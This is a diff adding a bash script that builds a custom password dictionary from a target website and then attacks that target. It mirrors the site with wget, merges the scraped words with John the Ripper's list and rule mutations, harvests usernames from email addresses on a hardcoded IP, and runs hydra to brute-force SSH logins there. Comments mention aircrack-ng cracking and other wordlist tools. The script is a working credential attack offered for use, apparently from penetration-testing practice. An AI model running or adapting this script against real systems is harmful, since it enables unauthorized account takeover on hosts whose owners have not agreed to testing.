@@ -1,0 +1,64 @@
+#!/bin/bash
+###
+#
+#  File:  customDict-v0.06.sh.txt
+#  Purpose:  take a website and create a custom dictionary
+#  Author:  SFC Hammond, Christopher J.
+#  Date:  16:21, 08/18/12
+#
+###
+
+
+# 
+#  Maintenance Record and versioning
+# 
+
+
+# 
+#  Syntax, notes, or instructions
+# 
+
+cd /tmp
+
+echo "\n"
+echo "enter URL or IP of target for custom WordList"
+echo "\n"
+read URL
+wget -r -l 2 $URL
+grep -hr "" $URL/ | tr " " '\n' | sort | uniq > wordList-1.txt
+#
+# Remove MetaCharacters
+#
+     # egrep -v '('\,'|'\;'|'\}'|'\{'|'\<'|'\>'|'\:'|'\='|'\"'|'\/'|'\/'|'\['|'\]')' wordList.txt  | sort -u > wordlist.clean.lst
+cp wordList-1.txt wordList-2.txt 
+cat wordList-2.txt | sed -e :a -e 's/<[^>]*>//g;/</N;//ba' | sed 's/(//g;s/)//g' | tr "/" " " | tr "." " " | tr "," " " | tr "\"" " " | tr ";" " " | tr "\'" " " | tr "\{" " " | tr "\}" " " | tr "\>" " " | tr "\-" " " | tr "\#" " " | tr "\:" " " | tr "\=" " " | tr "\!" " " | tr "\?" " " | tr " " "\n" | sed '/^$/d' | sed 's/^[ \t]*//;s/[ \t]*$//' | uniq | sort > wordList-3.txt
+cat wordList-3.txt | tr " " "\n" | sed 's/^[ \t]*//;s/[ \t]*$//' | sed '/^$/d' | sort | uniq > wordList-4.txt
+#
+# find jtr password list
+#
+for i in $(locate password.lst); do ls $i >> /tmp/locate.txt && cat /tmp/locate.txt | grep '.*john.*' | grep '.*text-base.*' > /tmp/locate2.txt; done
+
+for i in $(cat /tmp/locate2.txt); do cp $i /tmp/password.lst; done
+
+cp /tmp/password.lst /tmp/password2.lst
+
+cp /tmp/wordList-4.txt /tmp/wordList-5.txt
+ 
+cat /tmp/wordList-5.txt >> /tmp/password2.lst
+
+john --wordlist=password2.lst --rules --stdout | uniq | sort > grep.final.wordList.lst
+    ## john --stdout --incremental >wordlist.txt
+    ## john --incremental=All --stdout | aircrack-ng -b 00:11:22:33:44:55 -w --test.cap
+echo "grep.final.wordList.lst is in /tmp"
+    # perl -MCPAN -e shell
+    # install wlgmod::doc
+## perl ~/bin/wyd.pl -n -o /tmp/victims.wordList.lst -t -b -e /tmp/$URL
+
+grep -r '\@' /tmp/192.168.1.100/ | tr " " "\n" | grep '\@' | tr "\<" " " | tr " " "\n" | tr "\(" " " | tr " " "\n" | grep '\@' | sed s/\@.*$//g > /tmp/usernames.txt
+
+hydra -L /tmp/usernames.txt -P grep.final.wordList.lst -f -e nsr 192.168.1.100 ssh
+# crunch
+# wyd (who's your daddy)
+# cupp (leet speak)
+# john
+# thad0ctors Backtrack 5 toolkit v1.4.
